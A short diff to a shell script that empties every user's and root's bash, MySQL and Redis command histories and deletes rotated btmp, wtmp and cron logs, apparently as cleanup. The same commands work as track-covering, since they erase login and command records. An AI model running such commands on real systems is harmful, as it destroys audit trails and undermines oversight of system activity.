@@ -5,8 +5,14 @@ for i in `ls /home/`;
 do 
  HISDIR=/home/${i}/.bash_history 
  echo '' > ${HISDIR} 
+ MYSQLDIR=/home/${i}/.mysql_history
+ echo '' > ${MYSQLDIR}
+ REDISDIR=/home/${i}/.redis_history
+ echo '' > ${REDISDIR}
 done 
-echo '' > /root/.bash_history 
+echo '' > /root/.bash_history
+echo '' > /root/.mysql_history
+echo '' > /root/.redis_history
 rm -rf /var/log/btmp-* 
 rm -rf /var/log/wtmp-* 
 rm -rf /var/log/cron-* 
